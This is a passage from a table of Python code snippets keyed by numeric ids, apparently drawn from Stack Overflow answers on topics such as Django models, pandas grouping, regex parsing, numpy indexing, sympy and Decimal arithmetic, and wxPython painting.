    # Some nodes aren't full generated.
    try:
        DCT[root]
    except KeyError:
        return

    # End condition.
    if DCT[root] == ['DEADEND']:
        return
    # Path found.
    if DCT[root] == ['GOAL']:
        FOUND_PATHS.append(target_path)             # The normal path.
        reverse_path = cp.copy(target_path)
        reverse_path.reverse()
        FOUND_REVERSE_PATHS.append(reverse_path)     # The path you want.
        return

    for node in DCT[root]:
        # Makes copy of target parh and add the node.
        path_copy = cp.copy(target_path)
        path_copy.append(node)
        # Call back_track with current node and the copy 
        # of target_path.
        back_track(node, path_copy, counter=(counter - 1))

if __name__ == '__main__':
    back_track('4345092')
    print(FOUND_PATHS)
    print(FOUND_REVERSE_PATHS) 
</snippet></ROW><ROW><id>20353786</id><snippet>**</snippet></ROW><ROW><id>20353786</id><snippet>insert_client = db.insert('clients', **dict)
</snippet></ROW><ROW><id>20353786</id><snippet>dict</snippet></ROW><ROW><id>20353786</id><snippet>dict</snippet></ROW><ROW><id>20353935</id><snippet>&gt;&gt;&gt; import urllib
&gt;&gt;&gt; rawdata = urllib.urlopen('http://yahoo.co.jp/').read()
&gt;&gt;&gt; import chardet
&gt;&gt;&gt; chardet.detect(rawdata)
{'encoding': 'EUC-JP', 'confidence': 0.99}
</snippet></ROW><ROW><id>20354041</id><snippet>def is_circular(head):

     slow = head
     fast = head

     while fast != None:
         slow = slow.next

         if slow is fast:
              return True

         if fast.next != None:
              fast = fast.next.next
         else:
              return False

         if slow is fast:
              return True

    return False
</snippet></ROW><ROW><id>20354071</id><snippet>12 0 * * * python /Path/To/File.py  &gt; /Path/ToLog/log 2&gt;&amp;1
</snippet></ROW><ROW><id>20354078</id><snippet>ok = [(147.68485399616046, 3304.5385975548143),
      (168.3419544680192, 2336.686128749161),
      (188.1491476566771, 1331.864619054719),
      (211.6472437750393, 155.6040367158578),
      (2216.6064720878203, 3330.396441392227),
      (2233.7510405426237, 2363.6828015004367),
      (2250.9856437171966, 1360.935679736544),
      (2273.392518618822, 187.8742947415933)]
bad = [(203.68919057903938, 154.66471253728272),
       (2264.8873935264055, 180.78268029528675),
       (987.6169366297244, 1156.4133276499006),
       (184.2811080835604, 1331.004238570996),
       (167.45816773667582, 2336.89386528075),
       (2236.836364657011, 2356.0815089255643),
       (150.94371083838226, 3304.3057324840765),
       (2223.8576991353148, 3323.427188913703)]


def distance(xy1, xy2):
    (x1, y1), (x2, y2) = xy1, xy2
    return ((float(y2-y1))**2 + (float(x2-x1))**2)**0.5


def fake_image_corners(xy_sequence):
    """Get an approximation of image corners based on available data."""
    all_x, all_y = zip(*xy_sequence)
    min_x, max_x, min_y, max_y = min(all_x), max(all_x), min(all_y), max(all_y)
    d = dict()
    d['tl'] = min_x, min_y
    d['tr'] = max_x, min_y
    d['bl'] = min_x, max_y
    d['br'] = max_x, max_y
    return d


def corners(xy_sequence, image_corners):
    """Return a dict with the best point for each corner."""
    d = dict()
    d['tl'] = min(xy_sequence, key=lambda xy: distance(xy, image_corners['tl']))
    d['tr'] = min(xy_sequence, key=lambda xy: distance(xy, image_corners['tr']))
    d['bl'] = min(xy_sequence, key=lambda xy: distance(xy, image_corners['bl']))
    d['br'] = min(xy_sequence, key=lambda xy: distance(xy, image_corners['br']))
    return d


def main():
    for xy_sequence in (ok, bad):
        image_corners = fake_image_corners(xy_sequence)
        d = corners(xy_sequence, image_corners)
        print '********'
        for k, v in d.items():
            print k, v

main()
</snippet></ROW><ROW><id>20354078</id><snippet>********
bl (147.68485399616046, 3304.5385975548143)
tl (211.6472437750393, 155.6040367158578)
tr (2273.392518618822, 187.8742947415933)
br (2216.6064720878203, 3330.396441392227)
********
bl (150.94371083838226, 3304.3057324840765)
tl (203.68919057903938, 154.66471253728272)
tr (2264.8873935264055, 180.78268029528675)
br (2223.8576991353148, 3323.427188913703)
</snippet></ROW><ROW><id>20354129</id><snippet>_processes</snippet></ROW><ROW><id>20354129</id><snippet>&gt;&gt;&gt; import multiprocessing
&gt;&gt;&gt; pool = multiprocessing.Pool()
&gt;&gt;&gt; pool._processes
8
</snippet></ROW><ROW><id>20354129</id><snippet>multiprocessing.cpu_count()</snippet></ROW><ROW><id>20354129</id><snippet>Pool</snippet></ROW><ROW><id>20354129</id><snippet>&gt;&gt;&gt; multiprocessing.cpu_count()
8
</snippet></ROW><ROW><id>20354265</id><snippet>wx.StaticBox.OnPaint</snippet></ROW><ROW><id>20354265</id><snippet># custom StaticBox class
class MyStaticBox(wx.StaticBox):
  def __init__(self, *args, **kwargs):
    super(MyStaticBox, self).__init__(*args, **kwargs)
    self.Bind(wx.EVT_PAINT, self.OnPaint)

  def OnPaint(self, event):
    # do what you want here
    width, height = self.GetSize()
    dc = wx.PaintDC(self)
    dc.Clear()
    dc.SetPen(wx.Pen('#4285F4'))
    dc.DrawLine(0, 0, width, height)
    dc.DrawLine(width, 0, 0, height)
    # after you finished, call the StaticBox OnPaint
    super(MyStaticBox, self).OnPaint(event)
</snippet></ROW><ROW><id>20354265</id><snippet>import wx

# custom StaticBox class
class MyStaticBox(wx.StaticBox):
  def __init__(self, *args, **kwargs):
    super(MyStaticBox, self).__init__(*args, **kwargs)
    self.Bind(wx.EVT_PAINT, self.OnPaint)

  def OnPaint(self, event):
    # do what you want here
    width, height = self.GetSize()
    dc = wx.PaintDC(self)
    dc.Clear()
    dc.SetPen(wx.Pen('#4285F4'))
    dc.DrawLine(0, 0, width, height)
    dc.DrawLine(width, 0, 0, height)
    # after you finished, call the StaticBox OnPaint
    super(MyStaticBox, self).OnPaint(event)

class MainPanel(wx.Panel):
    def __init__(self, parent):
        wx.Panel.__init__(self, parent=parent)
        self.frame = parent

        MyStaticBox(self, -1, 'Example', (5, 30), size=(290, 185))

        #self.line = wx.StaticLine(self,-1, (25, 150), (100,1))
        #self.line.SetForegroundColour(("blue"))

class MainFrame(wx.Frame): 

    def __init__(self):
        wx.Frame.__init__(self, None, wx.ID_ANY, "Window",size=(305,430))
        panel = MainPanel(self)
        self.CenterOnParent()

if __name__ == "__main__":
    app = wx.App(False)
    frame = MainFrame()
    frame.Show()
    app.MainLoop()
</snippet></ROW><ROW><id>20354482</id><snippet>assertRaises</snippet></ROW><ROW><id>20354482</id><snippet>job2.clean</snippet></ROW><ROW><id>20354482</id><snippet>job2.clean()</snippet></ROW><ROW><id>20354482</id><snippet>self.assertRaises(ValidationError, job2.clean)
</snippet></ROW><ROW><id>20354546</id><snippet>sdev = sqrt(sum((y - np.polyval(fit, x))**2)/(len(y) - 1))
</snippet></ROW><ROW><id>20354546</id><snippet>def sdev_area_mn(x):
    return np.polyval(fit, x) - sdev
def sdev_area_mx(x):
    return np.polyval(fit, x) + sdev
</snippet></ROW><ROW><id>20354762</id><snippet>unwanted = set(keys) - set(data)
</snippet></ROW><ROW><id>20354762</id><snippet>unwanted</snippet></ROW><ROW><id>20354762</id><snippet>&gt;&gt;&gt; data = {'one': '1', 'two': '2', 'three': '3', 'four': '4', 'five': '5'}
&gt;&gt;&gt; unwanted = ('one', 'four')
&gt;&gt;&gt; for key in unwanted:
...     del data[key]
... 
&gt;&gt;&gt; data
{'three': '3', 'five': '5', 'two': '2'}
</snippet></ROW><ROW><id>20354857</id><snippet>import re
# assuming input_file to be a file-like object
header = input_file.next()

borders = [match.start() for match in re.finditer(r'\s+', header)]
second_to_third_border = borders[1]
borders = borders[1:-1] # delete the first and last because not right-aligned

for line in input_file:
    first_to_second_border = line[:second_to_third_border].rfind(' ')
    actual_borders = [0, first_to_second_border] + borders + [len(line)]
    dset = []
    for (s, e) in zip(actual_borders[:-1], actual_borders[1:]):
        dset.append(line[s:e].strip())
    print dset
</snippet></ROW><ROW><id>20354857</id><snippet>from StringIO import StringIO

input_file = StringIO('''\
COMMAND     PID       USER   FD      TYPE             DEVICE  SIZE/OFF       NODE NAME
init          1       root  cwd       DIR                8,1      4096          2 /
kthreadd      2       root  txt   unknown                                         /proc/2/exe
kjournald    42       root  txt   unknown                                         /proc/42/exe
''')
</snippet></ROW><ROW><id>20354857</id><snippet>['init', '1', 'root', 'cwd', 'DIR', '8,1', '4096', '2', '/']
['kthreadd', '2', 'root', 'txt', 'unknown', '', '', '', '/proc/2/exe']
['kjournald', '42', 'root', 'txt', 'unknown', '', '', '', '/proc/42/exe']
</snippet></ROW><ROW><id>20355011</id><snippet>sqlite3.connect()</snippet></ROW><ROW><id>20355011</id><snippet>import os

_module_directory = os.path.dirname(os.path.abspath(__file__))
</snippet></ROW><ROW><id>20355011</id><snippet>self.connection = sqlite3.connect(os.path.join(_module_directory, 'feedback.db'))
</snippet></ROW><ROW><id>20355046</id><snippet>findall()</snippet></ROW><ROW><id>20355046</id><snippet>results = tree.findall("dataqual/lineage/procstep/procdate")
if not results:
    print "(!) No revision date found"
else:
    for element in results:
        print "REVISION DATE: {}".format(element.text)
</snippet></ROW><ROW><id>20355046</id><snippet>not results</snippet></ROW><ROW><id>20355281</id><snippet>&gt;&gt;&gt; dict1 = {'a':(1, 4, 7), 'b':(2, 5, 8), 'c':(3, 6, 9)}
&gt;&gt;&gt; {x:tuple(z for z in y for _ in xrange(2)) for x,y in dict1.iteritems()}
{'a': (1, 1, 4, 4, 7, 7), 'c': (3, 3, 6, 6, 9, 9), 'b': (2, 2, 5, 5, 8, 8)}
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20355281</id><snippet>&gt;&gt;&gt; dict1 = {'a':(1, 4, 7), 'b':(2, 5, 8), 'c':(3, 6, 9)}
&gt;&gt;&gt; {x:tuple(z for z in y for _ in range(2)) for x,y in dict1.items()}
{'a': (1, 1, 4, 4, 7, 7), 'c': (3, 3, 6, 6, 9, 9), 'b': (2, 2, 5, 5, 8, 8)}
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20355305</id><snippet>autodoc: automatically insert docstrings from modules (y/N) [n]: y
</snippet></ROW><ROW><id>20355305</id><snippet>.. toctree::
   :maxdepth: 4

   modules
</snippet></ROW><ROW><id>20355305</id><snippet>mkdir doc</snippet></ROW><ROW><id>20355305</id><snippet>├── doc/
└── lib.py
</snippet></ROW><ROW><id>20355305</id><snippet>cd doc</snippet></ROW><ROW><id>20355305</id><snippet>sphinx-quickstart</snippet></ROW><ROW><id>20355305</id><snippet>autodoc: y</snippet></ROW><ROW><id>20355305</id><snippet>Makefile: y</snippet></ROW><ROW><id>20355305</id><snippet>sys.path.insert(0, os.path.abspath('..'))</snippet></ROW><ROW><id>20355305</id><snippet>.. toctree::
    :maxdepth: 2

    modules
</snippet></ROW><ROW><id>20355305</id><snippet>sphinx-apidoc -o . ..</snippet></ROW><ROW><id>20355305</id><snippet>make html</snippet></ROW><ROW><id>20355305</id><snippet>firefox _build/html/index.html</snippet></ROW><ROW><id>20355339</id><snippet>No JSON Object could be decoded</snippet></ROW><ROW><id>20355339</id><snippet>the response is on multiple lines</snippet></ROW><ROW><id>20355379</id><snippet>3</snippet></ROW><ROW><id>20355379</id><snippet>9</snippet></ROW><ROW><id>20355379</id><snippet>&gt;&gt;&gt; data[data[:, 2] == 3, 1] = 9
&gt;&gt;&gt; data
array([[1, 9, 3],
       [1, 9, 3],
       [1, 9, 3],
       [4, 5, 6]])
</snippet></ROW><ROW><id>20355571</id><snippet>&lt;strong&gt;__&lt;em&gt;iter&lt;/em&gt;__&lt;/strong&gt;</snippet></ROW><ROW><id>20355571</id><snippet>&lt;strong&gt;__&lt;em&gt;iter&lt;/em&gt;__&lt;/strong&gt;</snippet></ROW><ROW><id>20355571</id><snippet>&lt;strong&gt;__&lt;em&gt;getitem&lt;/em&gt;__&lt;/strong&gt;</snippet></ROW><ROW><id>20355571</id><snippet>&lt;strong&gt;__&lt;em&gt;getitem&lt;/em&gt;__&lt;/strong&gt;</snippet></ROW><ROW><id>20355571</id><snippet>&lt;strong&gt;__&lt;em&gt;iter&lt;/em&gt;__&lt;/strong&gt;</snippet></ROW><ROW><id>20355571</id><snippet>&lt;strong&gt;__&lt;em&gt;getitem&lt;/em&gt;__&lt;/strong&gt;</snippet></ROW><ROW><id>20355577</id><snippet>get_xticklabels</snippet></ROW><ROW><id>20355577</id><snippet>minor</snippet></ROW><ROW><id>20355577</id><snippet>minor==False</snippet></ROW><ROW><id>20355577</id><snippet>minor==True</snippet></ROW><ROW><id>20355577</id><snippet>which</snippet></ROW><ROW><id>20355670</id><snippet>order</snippet></ROW><ROW><id>20355670</id><snippet>class ActivityList(models.Model):
   activity = models.ForeignKey(Activity)
   list = models.ForeignKey(List)
   order = models.IntegerField()

class List(models.Model)
  activities = models.ManyToManyField(Activity, through='ActivityList')
</snippet></ROW><ROW><id>20355670</id><snippet>order</snippet></ROW><ROW><id>20355670</id><snippet>through</snippet></ROW><ROW><id>20355670</id><snippet>for activity in your_list.activities.all().order_by('order'):
   # display activity to user
</snippet></ROW><ROW><id>20355718</id><snippet>(?P&lt;groupname&gt;...)</snippet></ROW><ROW><id>20355718</id><snippet>(?&lt;groupname&gt;...)</snippet></ROW><ROW><id>20355718</id><snippet>P</snippet></ROW><ROW><id>20355744</id><snippet>formset.errors</snippet></ROW><ROW><id>20355744</id><snippet>if formset.is_valid() and formset.has_changed():
    formset.save()
else:
    print formset.errors
</snippet></ROW><ROW><id>20355747</id><snippet>PathsOfDomain</snippet></ROW><ROW><id>20355747</id><snippet>.objects</snippet></ROW><ROW><id>20355747</id><snippet>SitePaths = PathsOfDomain.objects.filter(FKtoTld__id=domain_in_session)
</snippet></ROW><ROW><id>20355747</id><snippet>Tld</snippet></ROW><ROW><id>20355747</id><snippet>PathsOfDomain</snippet></ROW><ROW><id>20355747</id><snippet>SitePaths = domain_in_session.pathsofdomain_set.all()
</snippet></ROW><ROW><id>20355909</id><snippet>Counter.most_common()</snippet></ROW><ROW><id>20355909</id><snippet>for roll, count in result.most_common():
    print '{}: {}'.format(roll, count)
</snippet></ROW><ROW><id>20355909</id><snippet>for roll in sorted(result):
     print '{}: {}'.format(roll, result[roll])
</snippet></ROW><ROW><id>20355941</id><snippet>r"$"</snippet></ROW><ROW><id>20355941</id><snippet>$</snippet></ROW><ROW><id>20355941</id><snippet>r'^$'</snippet></ROW><ROW><id>20356049</id><snippet>In [17]: df
Out[17]: 
           cusip    a     b         c
date                                 
1992-05-08   AAA  238  4256  3.523346
1992-07-13   AAA  234  4677  3.485577
1992-12-12   BBB  221  5150  3.240000
1995-12-12   BBB  254  5150  3.250000
1997-12-12   BBB  245  6150  3.250000
1998-12-12   CCC  234  5140  3.241450
1999-12-12   CCC  223  5120  3.651450

[7 rows x 4 columns]
</snippet></ROW><ROW><id>20356049</id><snippet>In [18]: df = df.sort_index()

In [19]: df
Out[19]: 
           cusip    a     b         c
date                                 
1992-05-08   AAA  238  4256  3.523346
1992-07-13   AAA  234  4677  3.485577
1992-12-12   BBB  221  5150  3.240000
1995-12-12   BBB  254  5150  3.250000
1997-12-12   BBB  245  6150  3.250000
1998-12-12   CCC  234  5140  3.241450
1999-12-12   CCC  223  5120  3.651450

[7 rows x 4 columns]
</snippet></ROW><ROW><id>20356049</id><snippet>In [20]: df.groupby('cusip').last()
Out[20]: 
         a     b         c
cusip                     
AAA    234  4677  3.485577
BBB    245  6150  3.250000
CCC    223  5120  3.651450

[3 rows x 3 columns]
</snippet></ROW><ROW><id>20356049</id><snippet>In [9]: df.reset_index().groupby('cusip').last().reset_index().set_index('date')
Out[9]: 
           cusip    a     b         c
date                                 
1992-07-13   AAA  234  4677  3.485577
1997-12-12   BBB  245  6150  3.250000
1999-12-12   CCC  223  5120  3.651450

[3 rows x 4 columns]
</snippet></ROW><ROW><id>20356200</id><snippet>os.path.abspath</snippet></ROW><ROW><id>20356200</id><snippet>os.path.join</snippet></ROW><ROW><id>20356200</id><snippet>file</snippet></ROW><ROW><id>20356200</id><snippet>file</snippet></ROW><ROW><id>20356200</id><snippet>file</snippet></ROW><ROW><id>20356200</id><snippet>del file
</snippet></ROW><ROW><id>20356200</id><snippet>open()</snippet></ROW><ROW><id>20356200</id><snippet>json.load()</snippet></ROW><ROW><id>20356200</id><snippet>s</snippet></ROW><ROW><id>20356200</id><snippet>with</snippet></ROW><ROW><id>20356200</id><snippet>with open(os.path.join(os.path.abspath(__file__), "res/channels.json")) as input_file:
    j = json.load(input_file)
</snippet></ROW><ROW><id>20356210</id><snippet>(\w+(?:\(\d+\))?)\s*=\s*(.*?)(?=(!|$|\w+(\(\d+\))?\s*=))
</snippet></ROW><ROW><id>20356210</id><snippet>&gt;&gt;&gt; matches = re.findall(r'(\w+(?:\(\d+\))?)\s*=\s*(.*?)(?=(!|$|\w+(\(\d+\))?\s*=))', testStr)
&gt;&gt;&gt; keyval = {}
&gt;&gt;&gt; for match in matches:
&gt;&gt;&gt;     vals = match[1].strip()
&gt;&gt;&gt;     keyval[match[0]] = re.split(r' (?![A-Za-z])', vals) 
</snippet></ROW><ROW><id>20356210</id><snippet>{
    'name': ['"my name is"'], 
    'single(1)': ['10'], 
    'single(2)': ['3.589'], 
    'multipleValues': ['0.543', '0.754', '1.166'], 
    'boolean': ['.True.', '.F.'], 
    'multipleValues(2)': ["'value'", '"Value2"', '4.76454', '100']
}
</snippet></ROW><ROW><id>20356276</id><snippet>try</snippet></ROW><ROW><id>20356276</id><snippet>pass</snippet></ROW><ROW><id>20356276</id><snippet>digitsum = 0
for i in s:
    try:
        digitsum += int(i)
    except ValueError:
        pass  # ignore non-digit characters
</snippet></ROW><ROW><id>20356276</id><snippet>TypeError</snippet></ROW><ROW><id>20356276</id><snippet>i</snippet></ROW><ROW><id>20356276</id><snippet>int()</snippet></ROW><ROW><id>20356276</id><snippet>&gt;&gt;&gt; int({})
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
TypeError: int() argument must be a string or a number, not 'dict'
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; (1.1+2.2-3.3)*10000000000000000000
4440.892098500626                            # relevant for government invoices...
&gt;&gt;&gt; import decimal
&gt;&gt;&gt; D=decimal.Decimal
&gt;&gt;&gt; (D('1.1')+D('2.2')-D('3.3'))*10000000000000000000
Decimal('0.0')
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; from fractions import Fraction
&gt;&gt;&gt; f = Fraction(1) / Fraction(3)
&gt;&gt;&gt; f
Fraction(1, 3)
&gt;&gt;&gt; f * 3 &lt; 1
False
&gt;&gt;&gt; f * 3 == 1
True
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; sympy.sympify('1/3')*3
1
&gt;&gt;&gt; (sympy.sympify('1/3')*3) == 1
True
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; math.sqrt(2)
1.4142135623730951
&gt;&gt;&gt; math.sqrt(2)*math.sqrt(2)
2.0000000000000004
&gt;&gt;&gt; math.sqrt(2)*math.sqrt(2)==2
False
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; sympy.sqrt(2)
sqrt(2)                              # treated symbolically
&gt;&gt;&gt; sympy.sqrt(2)*sympy.sqrt(2)==2
True
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; import sympy
&gt;&gt;&gt; sympy.sqrt(8)
2*sqrt(2)                            # √8 == √(4 x 2) == 2*√2...
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; 1.1+2.2-3.3
4.440892098500626e-16
&gt;&gt;&gt; sympy.sympify('1.1+2.2-3.3')
4.44089209850063e-16                   # :-(
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; D('1.1')+D('2.2')-D('3.3')
Decimal('0.0')
</snippet></ROW><ROW><id>20356293</id><snippet>1.1</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; sympy.sympify('11/10+22/10-33/10')==0
True
&gt;&gt;&gt; Fraction('1.1')+Fraction('2.2')-Fraction('3.3')==0
True
</snippet></ROW><ROW><id>20356293</id><snippet>&gt;&gt;&gt; frac=sympy.Rational
&gt;&gt;&gt; frac('1.1')+frac('2.2')-frac('3.3')==0
True
&gt;&gt;&gt; frac('1/3')*3
1
</snippet></ROW><ROW><id>20356332</id><snippet>iter()</snippet></ROW><ROW><id>20356332</id><snippet>def singular_item(collection):
    return next(iter(collection), None)
</snippet></ROW><ROW><id>20356332</id><snippet>iter()</snippet></ROW><ROW><id>20356332</id><snippet>collection.__iter__()</snippet></ROW><ROW><id>20356332</id><snippet>next()</snippet></ROW><ROW><id>20356332</id><snippet>collection</snippet></ROW><ROW><id>20356339</id><snippet>f</snippet></ROW><ROW><id>20356339</id><snippet>list</snippet></ROW><ROW><id>20356339</id><snippet>if 'Orange' in json.dumps(f):</snippet></ROW><ROW><id>20356339</id><snippet>Orange</snippet></ROW><ROW><id>20356339</id><snippet>f['fruits']</snippet></ROW><ROW><id>20356339</id><snippet>list</snippet></ROW><ROW><id>20356339</id><snippet>int</snippet></ROW><ROW><id>20356339</id><snippet>['Orange']</snippet></ROW><ROW><id>20356339</id><snippet>Orange</snippet></ROW><ROW><id>20356339</id><snippet> for value in f['fruits']:
    if 'Orange' in value:
        print value['Orange']
</snippet></ROW><ROW><id>20356388</id><snippet>import subprocess
subprocess.Popen(["notepad.exe"])
</snippet></ROW><ROW><id>20356473</id><snippet>null=True</snippet></ROW><ROW><id>20356473</id><snippet>skill = models.ForeignKey(Skill, blank=True, null=True)
</snippet></ROW><ROW><id>20356608</id><snippet>str.encode()</snippet></ROW><ROW><id>20356608</id><snippet>unicode</snippet></ROW><ROW><id>20356608</id><snippet>ASCII</snippet></ROW><ROW><id>20356608</id><snippet>&gt;&gt;&gt; '&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;o&gt;&lt;location&gt;san diego, ça&lt;/location&gt;&lt;/o&gt;'.encode('utf8')
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
UnicodeDecodeError: 'ascii' codec can't decode byte 0xc3 in position 62: ordinal not in range(128)
</snippet></ROW><ROW><id>20356608</id><snippet>.encode()</snippet></ROW><ROW><id>20356608</id><snippet>UnicodeDecodeError</snippet></ROW><ROW><id>20356608</id><snippet>ET.fromstring()</snippet></ROW><ROW><id>20356613</id><snippet>import datetime

row = ['resource', 1, 1.1, datetime.now(), 10]
r_rows = [row]

data_type = [('resource_name', np.str, 100),
             ('mobile_id_id', np.int8),
             ('value', np.float),
             ('update_time', '&lt;M8[us]'),
             ('capacity', np.int8)]

narray = np.fromiter((tuple(row) for row in r_rows), dtype=data_type)
</snippet></ROW><ROW><id>20356613</id><snippet>&gt;&gt;&gt; narray['update_time'][0]
numpy.datetime64('2013-12-03T16:27:05.456766+0000')
</snippet></ROW><ROW><id>20356667</id><snippet>X_HTTP_HEADERS</snippet></ROW><ROW><id>20356667</id><snippet>Python</snippet></ROW><ROW><id>20356667</id><snippet>PHP</snippet></ROW><ROW><id>20356667</id><snippet>$_GET</snippet></ROW><ROW><id>20356667</id><snippet>$_POST</snippet></ROW><ROW><id>20356667</id><snippet>$_COOKIE</snippet></ROW><ROW><id>20356775</id><snippet>self.parent.config(menu = self.menubar)
</snippet></ROW><ROW><id>20356844</id><snippet>tar = tarfile.open("/backup/output_filename.tar.gz", "w:gz")
tar.add(input)
tar.close()
</snippet></ROW><ROW><id>20357167</id><snippet>pprint</snippet></ROW><ROW><id>20357167</id><snippet>print</snippet></ROW><ROW><id>20357167</id><snippet>&gt;&gt;&gt; from sympy import *
&gt;&gt;&gt; init_printing(use_unicode=False, wrap_line=False, no_global=True)
&gt;&gt;&gt; x = Symbol('x')
&gt;&gt;&gt; r = integrate(x**2 + x + 1, x)
&gt;&gt;&gt; print(r)
x**3/3 + x**2/2 + x
&gt;&gt;&gt; pprint(r)
 3    2    
x    x     
-- + -- + x
3    2
</snippet></ROW><ROW><id>20357171</id><snippet>data[:,1:] - data[:,0,None]</snippet></ROW><ROW><id>20357171</id><snippet>None</snippet></ROW><ROW><id>20357171</id><snippet>np.newaxis</snippet></ROW><ROW><id>20357171</id><snippet>def loop(data):
    output = []
    for datum in data: # This outputs on (3x2) matrix after the other
        d0 = datum[0]
        dr = datum[1:]
        output.append(dr-d0)
    return output

def listcomp(data):
    output = [dr-d0 for (d0, dr) in zip(data[:,0], data[:,1:])]
    return output

def sub(data):
    output = data[:,1:] - data[:,0,None]
    return output
</snippet></ROW><ROW><id>20357171</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; n = 25
&gt;&gt;&gt; data = np.random.rand(n, 3, 2)
&gt;&gt;&gt; res_loop = loop(data)
&gt;&gt;&gt; res_listcomp = listcomp(data)
&gt;&gt;&gt; res_sub = sub(data)
&gt;&gt;&gt; np.allclose(res_loop, res_listcomp)
True
&gt;&gt;&gt; np.allclose(res_loop, res_sub)
True
&gt;&gt;&gt; 
&gt;&gt;&gt; %timeit loop(data)
10000 loops, best of 3: 184 µs per loop
&gt;&gt;&gt; %timeit listcomp(data)
10000 loops, best of 3: 158 µs per loop
&gt;&gt;&gt; %timeit sub(data)
100000 loops, best of 3: 12.8 µs per loop
</snippet></ROW><ROW><id>20357184</id><snippet>all()</snippet></ROW><ROW><id>20357184</id><snippet>a = 'asd'
b = 'dsa'

print all([a,b])
#True
</snippet></ROW><ROW><id>20357184</id><snippet>None</snippet></ROW><ROW><id>20357184</id><snippet>False</snippet></ROW><ROW><id>20357184</id><snippet>a = 'asd'
b = 'dsa'

if all([a,b]):
    print 'All True!!!!'
#All True!!!!
</snippet></ROW><ROW><id>20357247</id><snippet>&gt;&gt;&gt; d = {u'a': 2}
&gt;&gt;&gt; d
{u'a': 2}
</snippet></ROW><ROW><id>20357461</id><snippet>set</snippet></ROW><ROW><id>20357461</id><snippet>with open('listOfFruits.txt', 'r') as f:
    fruits = set([line.rstrip() for line in f])
with open('allFruitData.txt', 'r') as f:
    data = {}
    for line in f:
        fruit = line.rstrip().split()[2]
        data[fruit] = line

fruits_not_in_file = set(data.keys()) - fruits
with open(outfile, 'w') as f:
    for fruit in fruits_not_in_lile:
        f.write(data[fruit])
</snippet></ROW><ROW><id>20357461</id><snippet>with open('listOfFruits.txt', 'r') as f:
    fruits = set([line.rstrip() for line in f])

with open('outfile.txt', 'w') as outf, open('allFruitData.txt', 'r') as inf:
    for line in inf:
        words = set(line.rstrip().split())
        # you can replace this `if` with `if fruits &amp; words == set()`
        if not fruits &amp; words:
            outf.write(line)
</snippet></ROW><ROW><id>20357461</id><snippet>'grape'</snippet></ROW><ROW><id>20357461</id><snippet>'grapefruit'</snippet></ROW><ROW><id>20357461</id><snippet>\t</snippet></ROW><ROW><id>20357538</id><snippet>import sublime_plugin

class ShowZeroWidthSpace(sublime_plugin.EventListener):
    def on_modified(self, view):
        spaces = []
        p = 0
        while True:
            s = view.find(u'\u200b', p + 1)
            if not s:
                break
            spaces.append(s)
            p = s.a

        if spaces:
            view.add_regions("zero-width", spaces, "string")
        else:
            view.erase_regions("zero-width")
</snippet></ROW><ROW><id>20357538</id><snippet>Packages/User</snippet></ROW><ROW><id>20357538</id><snippet>show_zero_width_space.py</snippet></ROW><ROW><id>20357538</id><snippet>U+200B</snippet></ROW><ROW><id>20357538</id><snippet>string</snippet></ROW><ROW><id>20357538</id><snippet>show_zero_width_space.py.old</snippet></ROW><ROW><id>20357538</id><snippet>show_zero_width_space.pyc</snippet></ROW><ROW><id>20357659</id><snippet>dict</snippet></ROW><ROW><id>20357659</id><snippet>&gt;&gt;&gt; a = (1,2,3)
&gt;&gt;&gt; d = {}
&gt;&gt;&gt; d[a] = "hi"
&gt;&gt;&gt; d
{(1, 2, 3): 'hi'}
</snippet></ROW><ROW><id>20357659</id><snippet>dict</snippet></ROW><ROW><id>20357659</id><snippet>list</snippet></ROW><ROW><id>20357659</id><snippet>dict(zip(keys, values))</snippet></ROW><ROW><id>20357667</id><snippet>A = [33,55,-9999999,44,78,22,-9999999,10,34]
B = [22,33,65,87,43,87,32,77,99]
A1, B1 = (list(x) for x in zip(*((a, b) for a, b in zip(A, B) if a != -9999999)))
print(A1)
print(B1)
</snippet></ROW><ROW><id>20357667</id><snippet>[33, 55, 44, 78, 22, 10, 34]
[22, 33, 87, 43, 87, 77, 99]
</snippet></ROW><ROW><id>20357731</id><snippet>newCounter</snippet></ROW><ROW><id>20357731</id><snippet>Counter({('string3', 18): 1, ('string1', 48): 1, ('string2', 48): 1})
</snippet></ROW><ROW><id>20357731</id><snippet>newCounter</snippet></ROW><ROW><id>20357731</id><snippet>print type(newCounter)
&lt;class 'collections.Counter'&gt;
</snippet></ROW><ROW><id>20357878</id><snippet>B.A1.__doc__ += constString</snippet></ROW><ROW><id>20357878</id><snippet>B.A1.__func__.__doc__ += constString
</snippet></ROW><ROW><id>20357963</id><snippet>writerows()</snippet></ROW><ROW><id>20357963</id><snippet>import csv

data = [[(1,1)], [(1,2), (3,4)], [(1,3)]]

with open("file.csv", "wb") as afile:
    writer = csv.writer(afile)
    writer.writerows((coord for coord in data))

print [row for row in csv.reader(open("file.csv", "rb"))]
</snippet></ROW><ROW><id>20357963</id><snippet>[['(1, 1)'], ['(1, 2)', '(3, 4)'], ['(1, 3)']]
</snippet></ROW><ROW><id>20358013</id><snippet>start_url = str(get_url())
</snippet></ROW><ROW><id>20358013</id><snippet>start_urls = [str(get_url())]
</snippet></ROW><ROW><id>20358013</id><snippet>def web_crawling(self):
</snippet></ROW><ROW><id>20358013</id><snippet>def web_crawling(self, response):
</snippet></ROW><ROW><id>20358013</id><snippet>from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from scrapy.settings import Settings
from scrapy.crawler import Crawler
from scrapy.statscol import StatsCollector

class MySpider(CrawlSpider):
    name = "mySpider"
    def get_url():
        url = raw_input('Enter the url of your website (including the http)')
        return url 
